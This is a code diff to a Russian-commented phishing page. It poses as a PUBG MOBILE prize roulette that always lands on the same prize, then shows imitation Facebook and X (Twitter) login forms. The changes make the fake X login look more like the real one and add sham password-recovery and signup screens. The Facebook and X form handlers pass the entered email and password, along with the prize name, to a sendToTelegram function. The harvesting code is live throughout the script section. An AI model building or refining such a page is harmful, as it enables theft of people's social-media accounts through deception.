@@ -143,7 +143,6 @@
             overflow: hidden;
             z-index: 3;
             pointer-events: auto;
-            /* Анимация пульсации добавлена обратно */
             animation: pulse 2s infinite;
         }
 
@@ -151,14 +150,14 @@
             transform: scale(1.05);
             box-shadow: 0 0 30px rgba(255, 215, 0, 1);
             background: linear-gradient(45deg, #ffd700, gold);
-            animation: none; /* Останавливаем пульсацию при наведении */
+            animation: none;
         }
 
         .spin-button:disabled {
             opacity: 0.5;
             cursor: not-allowed;
             transform: none;
-            animation: none; /* Останавливаем пульсацию когда кнопка отключена */
+            animation: none;
         }
 
         .spin-button::before {
@@ -175,69 +174,6 @@
 
         .spin-button:hover::before {
             left: 100%;
-        }
-
-        /* Анимация выигрыша */
-        @keyframes prizeWin {
-            0% {
-                transform: scale(1);
-                filter: brightness(1) drop-shadow(0 0 0px gold);
-            }
-            25% {
-                transform: scale(1.2);
-                filter: brightness(1.3) drop-shadow(0 0 20px gold);
-            }
-            50% {
-                transform: scale(1.1);
-                filter: brightness(1.5) drop-shadow(0 0 30px gold);
-            }
-            75% {
-                transform: scale(1.2);
-                filter: brightness(1.3) drop-shadow(0 0 20px gold);
-            }
-            100% {
-                transform: scale(1);
-                filter: brightness(1) drop-shadow(0 0 0px gold);
-            }
-        }
-
-        .prize-win-animation {
-            animation: prizeWin 1.5s ease-in-out 2;
-        }
-
-        /* Стрелка-указатель на кнопку */
-        .arrow-pointer {
-            position: absolute;
-            bottom: 120px;
-            right: 50%;
-            transform: translateX(50%) rotate(0deg);
-            z-index: 10;
-            pointer-events: none;
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-
-        .arrow-pointer.show {
-            opacity: 1;
-        }
-
-        .arrow-pointer svg {
-            width: 60px;
-            height: 60px;
-            filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.8));
-        }
-
-        @keyframes arrowBounce {
-            0%, 100% {
-                transform: translateX(50%) translateY(0);
-            }
-            50% {
-                transform: translateX(50%) translateY(-15px);
-            }
-        }
-
-        .arrow-pointer.show svg {
-            animation: arrowBounce 1.5s infinite ease-in-out;
         }
 
         /* Модальные окна */
@@ -292,11 +228,9 @@
             max-height: 200px;
             width: auto;
             height: auto;
-            /* Убраны все рамки и скругления */
             border: none;
             border-radius: 0;
             box-shadow: none;
-            transition: all 0.3s;
         }
 
         .login-options {
@@ -589,83 +523,107 @@
             border-top: 1px solid #dddfe2;
         }
 
-        /* Стили для Twitter окна */
+        /* Улучшенные стили для Twitter окна */
         .twitter-modal-content {
             background: #000;
             color: #fff;
             min-height: 600px;
+            max-width: 400px;
+            width: 100%;
         }
 
         .twitter-header {
-            padding: 25px 20px;
+            padding: 25px 20px 20px;
             text-align: center;
-            border-bottom: 1px solid #333;
+            border-bottom: 1px solid #2f3336;
         }
 
         .twitter-logo {
-            color: #1da1f2;
-            font-size: 2.5rem;
-            margin-bottom: 15px;
+            color: #fff;
+            font-size: 2.8rem;
+            margin-bottom: 20px;
+            font-weight: bold;
         }
 
         .twitter-title {
             font-size: 1.8rem;
-            font-weight: bold;
+            font-weight: 700;
             margin-bottom: 10px;
+            color: #e7e9ea;
         }
 
         .twitter-subtitle {
-            color: #999;
-            font-size: 1.1rem;
+            color: #71767b;
+            font-size: 1rem;
+            line-height: 1.4;
         }
 
         .twitter-form {
-            padding: 25px 20px;
+            padding: 20px;
+        }
+
+        .twitter-input-group {
+            margin-bottom: 20px;
         }
 
         .twitter-input {
             width: 100%;
-            padding: 15px;
-            margin-bottom: 20px;
+            padding: 17px;
             background: transparent;
-            border: 2px solid #333;
+            border: 1px solid #2f3336;
             border-radius: 4px;
-            color: white;
+            color: #e7e9ea;
             font-size: 1rem;
+            transition: border-color 0.2s;
         }
 
         .twitter-input:focus {
             outline: none;
-            border-color: #1da1f2;
+            border-color: #1d9bf0;
+            border-width: 2px;
+        }
+
+        .twitter-input::placeholder {
+            color: #71767b;
         }
 
         .twitter-next-button {
             width: 100%;
             padding: 15px;
             background: #fff;
-            color: #000;
+            color: #0f1419;
             border: none;
             border-radius: 50px;
-            font-size: 1.1rem;
-            font-weight: bold;
+            font-size: 1rem;
+            font-weight: 700;
             cursor: pointer;
             margin-bottom: 20px;
+            transition: background-color 0.2s;
         }
 
-        .twitter-forgot {
-            color: #1da1f2;
+        .twitter-next-button:hover {
+            background: #e6e6e6;
+        }
+
+        .twitter-forgot-link {
+            color: #1d9bf0;
             text-decoration: none;
             font-size: 0.9rem;
             display: block;
             text-align: center;
             margin-bottom: 30px;
+            transition: color 0.2s;
+        }
+
+        .twitter-forgot-link:hover {
+            text-decoration: underline;
         }
 
         .twitter-divider {
             display: flex;
             align-items: center;
             margin: 25px 0;
-            color: #666;
+            color: #71767b;
         }
 
         .twitter-divider::before,
@@ -673,64 +631,298 @@
             content: '';
             flex: 1;
             height: 1px;
-            background: #333;
+            background: #2f3336;
         }
 
         .twitter-divider span {
             padding: 0 15px;
+            font-size: 0.9rem;
         }
 
-        .twitter-google-button {
+        .twitter-alt-button {
             width: 100%;
-            padding: 15px;
+            padding: 14px;
             background: transparent;
-            border: 1px solid #333;
+            border: 1px solid #2f3336;
             border-radius: 50px;
-            color: white;
-            font-size: 1rem;
-            font-weight: bold;
+            color: #e7e9ea;
+            font-size: 0.95rem;
+            font-weight: 700;
             cursor: pointer;
-            margin-bottom: 15px;
+            margin-bottom: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            gap: 8px;
+            transition: background-color 0.2s;
         }
 
-        .twitter-apple-button {
-            width: 100%;
-            padding: 15px;
-            background: transparent;
-            border: 1px solid #333;
-            border-radius: 50px;
-            color: white;
-            font-size: 1rem;
-            font-weight: bold;
-            cursor: pointer;
-            margin-bottom: 30px;
+        .twitter-alt-button:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .twitter-alt-button.google::before {
+            content: 'G';
+            background: #fff;
+            color: #000;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            font-weight: bold;
+            font-size: 0.9rem;
+        }
+
+        .twitter-alt-button.apple::before {
+            content: '';
+            font-size: 1.2rem;
         }
 
         .twitter-signup {
             text-align: center;
-            color: #666;
-            margin-top: 20px;
+            color: #71767b;
+            margin-top: 40px;
+            font-size: 0.9rem;
         }
 
-        .twitter-signup a {
-            color: #1da1f2;
+        .twitter-signup-link {
+            color: #1d9bf0;
             text-decoration: none;
+            transition: text-decoration 0.2s;
+        }
+
+        .twitter-signup-link:hover {
+            text-decoration: underline;
         }
 
         .twitter-footer {
             padding: 20px;
-            border-top: 1px solid #333;
-            font-size: 0.8rem;
-            color: #666;
+            border-top: 1px solid #2f3336;
+            font-size: 0.75rem;
+            color: #71767b;
             text-align: center;
+            margin-top: auto;
+        }
+
+        /* Стили для окна забытого пароля */
+        .forgot-password-modal {
+            background: #000;
+            color: #fff;
+            max-width: 400px;
+            width: 100%;
+            border-radius: 16px;
+            overflow: hidden;
+        }
+
+        .forgot-password-header {
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border-bottom: 1px solid #2f3336;
+        }
+
+        .back-button {
+            background: none;
+            border: none;
+            color: #e7e9ea;
+            font-size: 1.5rem;
+            cursor: pointer;
+            padding: 5px;
+            border-radius: 50%;
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background-color 0.2s;
+        }
+
+        .back-button:hover {
+            background: rgba(239, 243, 244, 0.1);
+        }
+
+        .forgot-password-title {
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: #e7e9ea;
+        }
+
+        .forgot-password-content {
+            padding: 20px;
+        }
+
+        .forgot-password-text {
+            color: #e7e9ea;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+
+        .email-input {
+            width: 100%;
+            padding: 17px;
+            background: transparent;
+            border: 1px solid #2f3336;
+            border-radius: 4px;
+            color: #e7e9ea;
+            font-size: 1rem;
+            margin-bottom: 20px;
+        }
+
+        .email-input:focus {
+            outline: none;
+            border-color: #1d9bf0;
+            border-width: 2px;
+        }
+
+        .search-button {
+            width: 100%;
+            padding: 15px;
+            background: #fff;
+            color: #0f1419;
+            border: none;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .search-button:hover {
+            background: #e6e6e6;
+        }
+
+        /* Стили для окна регистрации */
+        .signup-modal {
+            background: #000;
+            color: #fff;
+            max-width: 400px;
+            width: 100%;
+            border-radius: 16px;
+            overflow: hidden;
+        }
+
+        .signup-header {
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #2f3336;
+        }
+
+        .signup-logo {
+            color: #fff;
+            font-size: 2rem;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+
+        .signup-title {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #e7e9ea;
+            margin-bottom: 10px;
+        }
+
+        .signup-subtitle {
+            color: #71767b;
+            font-size: 0.9rem;
+            line-height: 1.4;
+        }
+
+        .signup-content {
+            padding: 20px;
+        }
+
+        .signup-alt-button {
+            width: 100%;
+            padding: 14px;
+            background: transparent;
+            border: 1px solid #2f3336;
+            border-radius: 50px;
+            color: #e7e9ea;
+            font-size: 0.95rem;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background-color 0.2s;
+        }
+
+        .signup-alt-button:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .signup-divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #71767b;
+        }
+
+        .signup-divider::before,
+        .signup-divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #2f3336;
+        }
+
+        .signup-divider span {
+            padding: 0 15px;
+            font-size: 0.9rem;
+        }
+
+        .create-account-button {
+            width: 100%;
+            padding: 15px;
+            background: #fff;
+            color: #0f1419;
+            border: none;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 15px;
+            transition: background-color 0.2s;
+        }
+
+        .create-account-button:hover {
+            background: #e6e6e6;
+        }
+
+        .signup-terms {
+            color: #71767b;
+            font-size: 0.75rem;
+            line-height: 1.4;
+            margin-bottom: 30px;
+        }
+
+        .signup-terms a {
+            color: #1d9bf0;
+            text-decoration: none;
+        }
+
+        .signup-terms a:hover {
+            text-decoration: underline;
+        }
+
+        .login-link {
+            color: #71767b;
+            font-size: 0.9rem;
+            text-align: center;
+        }
+
+        .login-link a {
+            color: #1d9bf0;
+            text-decoration: none;
+        }
+
+        .login-link a:hover {
+            text-decoration: underline;
         }
 
         /* Стили для окна успеха */
@@ -759,7 +951,6 @@
             max-height: 150px;
             width: auto;
             height: auto;
-            /* Убраны все рамки и скругления */
             border: none;
             border-radius: 0;
             box-shadow: none;
@@ -794,7 +985,6 @@
             100% { filter: drop-shadow(0 0 5px gold); }
         }
 
-        /* Анимация пульсации для кнопки добавлена обратно */
         @keyframes pulse {
             0% {
                 transform: scale(1);
@@ -840,13 +1030,10 @@
                 min-height: 550px;
             }
 
-            .arrow-pointer {
-                bottom: 110px;
-            }
-
-            .arrow-pointer svg {
-                width: 50px;
-                height: 50px;
+            .twitter-modal-content,
+            .forgot-password-modal,
+            .signup-modal {
+                max-width: 95%;
             }
         }
 
@@ -885,13 +1072,12 @@
                 font-size: 0.9rem;
             }
 
-            .arrow-pointer {
-                bottom: 100px;
+            .twitter-title {
+                font-size: 1.6rem;
             }
 
-            .arrow-pointer svg {
-                width: 40px;
-                height: 40px;
+            .twitter-subtitle {
+                font-size: 0.9rem;
             }
         }
     </style>
@@ -901,13 +1087,6 @@
         <div class="background-top"></div>
         <div class="background-bottom"></div>
         <div class="gradient-overlay"></div>
-    </div>
-
-    <!-- Стрелка-указатель -->
-    <div class="arrow-pointer" id="arrowPointer">
-        <svg viewBox="0 0 24 24" fill="gold">
-            <path d="M13 3v7h7v2h-7v7h-2v-7H4v-2h7V3h2z"/>
-        </svg>
     </div>
 
     <div class="container">
@@ -1012,22 +1191,27 @@
             </div>
             
             <form class="twitter-form" id="twitterForm">
-                <input type="text" class="twitter-input" id="twitterEmail" placeholder="Phone number or email address" required>
-                <input type="password" class="twitter-input" id="twitterPassword" placeholder="Password" required>
+                <div class="twitter-input-group">
+                    <input type="text" class="twitter-input" id="twitterEmail" placeholder="Phone number or email address" required>
+                </div>
+                
+                <div class="twitter-input-group">
+                    <input type="password" class="twitter-input" id="twitterPassword" placeholder="Password" required>
+                </div>
                 
                 <button type="submit" class="twitter-next-button">Next</button>
                 
-                <a href="#" class="twitter-forgot" id="twitterForgot">Forgot password?</a>
+                <a href="#" class="twitter-forgot-link" id="twitterForgot">Forgot password?</a>
                 
                 <div class="twitter-divider">
                     <span>or</span>
                 </div>
                 
-                <button type="button" class="twitter-google-button" id="twitterGoogle">
+                <button type="button" class="twitter-alt-button google" id="twitterGoogle">
                     <span>Sign in with Google</span>
                 </button>
                 
-                <button type="button" class="twitter-apple-button" id="twitterApple">
+                <button type="button" class="twitter-alt-button apple" id="twitterApple">
                     <span>Sign in with Apple</span>
                 </button>
                 
@@ -1038,6 +1222,63 @@
             
             <div class="twitter-footer">
                 © 2024 X Corp.
+            </div>
+        </div>
+    </div>
+
+    <!-- Модальное окно восстановления пароля Twitter -->
+    <div class="modal-overlay" id="twitterForgotModal">
+        <div class="forgot-password-modal">
+            <div class="forgot-password-header">
+                <button class="back-button" id="backToTwitter">←</button>
+                <div class="forgot-password-title">Find your X account</div>
+            </div>
+            
+            <div class="forgot-password-content">
+                <div class="forgot-password-text">
+                    Enter your email, phone number, or username to search for your account.
+                </div>
+                
+                <input type="text" class="email-input" id="forgotEmail" placeholder="Email, phone number, or username" required>
+                
+                <button class="search-button" id="searchAccount">Search</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Модальное окно регистрации Twitter -->
+    <div class="modal-overlay" id="twitterSignupModal">
+        <div class="signup-modal">
+            <div class="signup-header">
+                <div class="signup-logo">𝕏</div>
+                <div class="signup-title">Join X today</div>
+                <div class="signup-subtitle">Create an account to connect to PUBG MOBILE</div>
+            </div>
+            
+            <div class="signup-content">
+                <button class="signup-alt-button google" id="signupGoogle">
+                    <span>Sign up with Google</span>
+                </button>
+                
+                <button class="signup-alt-button apple" id="signupApple">
+                    <span>Sign up with Apple</span>
+                </button>
+                
+                <div class="signup-divider">
+                    <span>or</span>
+                </div>
+                
+                <button class="create-account-button" id="createTwitterAccount">
+                    Create account
+                </button>
+                
+                <div class="signup-terms">
+                    By signing up, you agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>, including <a href="#">Cookie Use</a>.
+                </div>
+                
+                <div class="login-link">
+                    Already have an account? <a href="#" id="backToTwitterLogin">Sign in</a>
+                </div>
             </div>
         </div>
     </div>
@@ -1067,12 +1308,12 @@
     </div>
 
     <script>
-        // Конфигурация призов (mummy находится на 4-й позиции, индекс 3)
+        // Конфигурация призов
         const prizes = [
             { name: "pharaon", image: "pharaon.png" },
             { name: "material", image: "material.png" },
             { name: "m416lednik", image: "m416lednik.png" },
-            { name: "mummy", image: "mummy.png" }, // Это 4-й приз, индекс 3 - МУМИЯ
+            { name: "mummy", image: "mummy.png" },
             { name: "m416shut", image: "m416shut.png" },
             { name: "8500uc", image: "8500uc.png" },
             { name: "shorti", image: "shorti.png" },
@@ -1093,10 +1334,11 @@
         const winModal = document.getElementById('winModal');
         const facebookModal = document.getElementById('facebookModal');
         const twitterModal = document.getElementById('twitterModal');
+        const twitterForgotModal = document.getElementById('twitterForgotModal');
+        const twitterSignupModal = document.getElementById('twitterSignupModal');
         const successModal = document.getElementById('successModal');
         const winPrizeImage = document.getElementById('winPrizeImage');
         const successPrizeImage = document.getElementById('successPrizeImage');
-        const arrowPointer = document.getElementById('arrowPointer');
         
         // Login options
         const facebookOption = document.getElementById('facebookOption');
@@ -1104,14 +1346,13 @@
         const confirmLogin = document.getElementById('confirmLogin');
 
         let isSpinning = false;
-        let hasSpun = false; // Флаг для ограничения одного вращения
+        let hasSpun = false;
         let currentRotation = 0;
         let currentPrize = null;
-        let selectedLoginOption = 'facebook'; // По умолчанию Facebook
+        let selectedLoginOption = 'facebook';
 
         // Инициализация
         function initialize() {
-            // Сброс состояния при загрузке страницы
             hasSpun = false;
             spinButton.disabled = false;
             spinButton.textContent = "КРУТИТЬ РУЛЕТКУ";
@@ -1119,20 +1360,15 @@
             prizeWheel.style.transform = 'rotate(0deg)';
             currentRotation = 0;
             
-            // Установка выбора по умолчанию
             facebookOption.classList.add('active');
             twitterOption.classList.remove('active');
             selectedLoginOption = 'facebook';
             
-            // Восстанавливаем анимацию пульсации
             spinButton.style.animation = 'pulse 2s infinite';
             
-            // Показываем стрелку через 2 секунды после загрузки
-            setTimeout(() => {
-                if (!hasSpun) {
-                    arrowPointer.classList.add('show');
-                }
-            }, 2000);
+            // Очистка форм
+            document.getElementById('twitterForm').reset();
+            document.getElementById('facebookForm').reset();
         }
 
         // Функция вращения рулетки (ВСЕГДА на Mummy)
@@ -1142,54 +1378,30 @@
             isSpinning = true;
             spinButton.disabled = true;
             spinButton.textContent = "КРУТИТЬ РУЛЕТКУ";
-            // Останавливаем анимацию пульсации во время вращения
             spinButton.style.animation = 'none';
             
-            // Скрываем стрелку
-            arrowPointer.classList.remove('show');
-            
-            // ВСЕГДА выбираем приз "mummy" (мумию) - индекс 3
-            const TARGET_PRIZE_INDEX = 3; // mummy всегда
+            const TARGET_PRIZE_INDEX = 3;
             currentPrize = prizes[TARGET_PRIZE_INDEX];
             
-            // ПРАВИЛЬНЫЙ УГОЛ для мумии СПРАВА
-            const anglePerPrize = 30; // 360 / 12 = 30 градусов на приз
-            const baseAngle = TARGET_PRIZE_INDEX * anglePerPrize; // 3 * 30 = 90
+            const anglePerPrize = 30;
+            const baseAngle = TARGET_PRIZE_INDEX * anglePerPrize;
+            const correctionAngle = 90 - 30;
+            const targetAngle = baseAngle + correctionAngle;
+            const spins = 5;
+            const totalRotation = (spins * 360) + targetAngle;
             
-            // Корректировка: чтобы мумия была точно вверху (на 12 часов)
-            const correctionAngle = 90 - 30; // 60 градусов
-            const targetAngle = baseAngle + correctionAngle; // 90 + 60 = 150
-            
-            // Делаем 5 полных оборотов плюс угол до приза
-            const spins = 5; // Фиксированное количество оборотов
-            const totalRotation = (spins * 360) + targetAngle; // 1800 + 150 = 1950 градусов
-            
-            // Анимация вращения с эффектом замедления
             prizeWheel.style.transition = 'transform 4s cubic-bezier(0.2, 0.8, 0.2, 1)';
             currentRotation = totalRotation;
             prizeWheel.style.transform = `rotate(${currentRotation}deg)`;
             
-            // Отмечаем, что вращение уже было
             hasSpun = true;
             
-            // Показ модального окна с выигрышем через 4 секунды
             setTimeout(() => {
                 winPrizeImage.src = currentPrize.image;
                 winModal.style.display = 'flex';
                 isSpinning = false;
-                // Не включаем кнопку обратно после вращения
                 spinButton.disabled = true;
                 spinButton.style.opacity = '0.5';
-                
-                // Добавляем анимацию выигрыша
-                setTimeout(() => {
-                    winPrizeImage.classList.add('prize-win-animation');
-                    
-                    // Убираем анимацию после завершения
-                    setTimeout(() => {
-                        winPrizeImage.classList.remove('prize-win-animation');
-                    }, 3000);
-                }, 300);
             }, 4000);
         }
 
@@ -1263,7 +1475,6 @@
             const email = document.getElementById('fbEmail').value;
             const password = document.getElementById('fbPassword').value;
             
-            // Отправка данных в Telegram
             const success = await sendToTelegram({
                 prize: currentPrize.name,
                 login: email,
@@ -1275,16 +1486,6 @@
                 facebookModal.style.display = 'none';
                 successPrizeImage.src = currentPrize.image;
                 successModal.style.display = 'flex';
-                
-                // Анимация приза в окне успеха
-                setTimeout(() => {
-                    successPrizeImage.classList.add('prize-win-animation');
-                    
-                    // Убираем анимацию после завершения
-                    setTimeout(() => {
-                        successPrizeImage.classList.remove('prize-win-animation');
-                    }, 3000);
-                }, 300);
             }
         });
 
@@ -1295,7 +1496,6 @@
             const email = document.getElementById('twitterEmail').value;
             const password = document.getElementById('twitterPassword').value;
             
-            // Отправка данных в Telegram
             const success = await sendToTelegram({
                 prize: currentPrize.name,
                 login: email,
@@ -1307,20 +1507,81 @@
                 twitterModal.style.display = 'none';
                 successPrizeImage.src = currentPrize.image;
                 successModal.style.display = 'flex';
-                
-                // Анимация приза в окне успеха
-                setTimeout(() => {
-                    successPrizeImage.classList.add('prize-win-animation');
-                    
-                    // Убираем анимацию после завершения
-                    setTimeout(() => {
-                        successPrizeImage.classList.remove('prize-win-animation');
-                    }, 3000);
-                }, 300);
             }
         });
 
-        // Кнопки "Not now"
+        // Кнопка "Забыли пароль?" Twitter
+        document.getElementById('twitterForgot').addEventListener('click', (e) => {
+            e.preventDefault();
+            twitterModal.style.display = 'none';
+            twitterForgotModal.style.display = 'flex';
+        });
+
+        // Кнопка "Назад" из восстановления пароля
+        document.getElementById('backToTwitter').addEventListener('click', () => {
+            twitterForgotModal.style.display = 'none';
+            twitterModal.style.display = 'flex';
+        });
+
+        // Поиск аккаунта (восстановление пароля)
+        document.getElementById('searchAccount').addEventListener('click', () => {
+            const email = document.getElementById('forgotEmail').value;
+            if (email) {
+                // В реальном приложении здесь была бы логика восстановления пароля
+                alert(`Instructions for account recovery have been sent to ${email}`);
+                twitterForgotModal.style.display = 'none';
+                twitterModal.style.display = 'flex';
+            } else {
+                alert('Please enter your email, phone number, or username');
+            }
+        });
+
+        // Кнопка регистрации в Twitter
+        document.getElementById('twitterSignup').addEventListener('click', (e) => {
+            e.preventDefault();
+            twitterModal.style.display = 'none';
+            twitterSignupModal.style.display = 'flex';
+        });
+
+        // Кнопка "Назад" из регистрации
+        document.getElementById('backToTwitterLogin').addEventListener('click', (e) => {
+            e.preventDefault();
+            twitterSignupModal.style.display = 'none';
+            twitterModal.style.display = 'flex';
+        });
+
+        // Создание аккаунта Twitter
+        document.getElementById('createTwitterAccount').addEventListener('click', () => {
+            // В реальном приложении здесь была бы форма регистрации
+            alert('Twitter account creation form would open here');
+            // Можно добавить переход на форму регистрации
+        });
+
+        // Вход через Google (Twitter)
+        document.getElementById('twitterGoogle').addEventListener('click', () => {
+            // Имитация входа через Google
+            alert('Google authentication would open here');
+            // В реальном приложении здесь была бы OAuth аутентификация
+        });
+
+        // Вход через Apple (Twitter)
+        document.getElementById('twitterApple').addEventListener('click', () => {
+            // Имитация входа через Apple
+            alert('Apple authentication would open here');
+            // В реальном приложении здесь была бы OAuth аутентификация
+        });
+
+        // Регистрация через Google
+        document.getElementById('signupGoogle').addEventListener('click', () => {
+            alert('Google sign-up authentication would open here');
+        });
+
+        // Регистрация через Apple
+        document.getElementById('signupApple').addEventListener('click', () => {
+            alert('Apple sign-up authentication would open here');
+        });
+
+        // Кнопки Facebook
         document.getElementById('fbNotNow').addEventListener('click', (e) => {
             e.preventDefault();
             facebookModal.style.display = 'none';
@@ -1329,35 +1590,11 @@
 
         document.getElementById('forgotPassword').addEventListener('click', (e) => {
             e.preventDefault();
-            // В реальном приложении здесь была бы страница восстановления пароля
-            alert('Password recovery feature would open here');
+            alert('Facebook password recovery would open here');
         });
 
-        document.getElementById('twitterForgot').addEventListener('click', (e) => {
-            e.preventDefault();
-            // В реальном приложении здесь была бы страница восстановления пароля
-            alert('Password recovery feature would open here');
-        });
-
-        // Создание аккаунта
         document.getElementById('createAccount').addEventListener('click', () => {
-            // В реальном приложении здесь была бы страница создания аккаунта
-            alert('Account creation page would open here');
-        });
-
-        document.getElementById('twitterSignup').addEventListener('click', (e) => {
-            e.preventDefault();
-            // В реальном приложении здесь была бы страница регистрации
-            alert('Twitter signup page would open here');
-        });
-
-        // Альтернативные способы входа
-        document.getElementById('twitterGoogle').addEventListener('click', () => {
-            alert('Google sign-in would open here');
-        });
-
-        document.getElementById('twitterApple').addEventListener('click', () => {
-            alert('Apple sign-in would open here');
+            alert('Facebook account creation would open here');
         });
 
         // Кнопки успешного получения
@@ -1367,7 +1604,6 @@
 
         document.getElementById('okSuccess').addEventListener('click', () => {
             successModal.style.display = 'none';
-            // Можно добавить редирект или другие действия
         });
 
         // Блокировка прокрутки
@@ -1395,11 +1631,6 @@
                     modal.style.display = 'none';
                 }
             });
-        });
-
-        // Скрытие стрелки при наведении на кнопку
-        spinButton.addEventListener('mouseenter', () => {
-            arrowPointer.classList.remove('show');
         });
 
         // Инициализация при загрузке
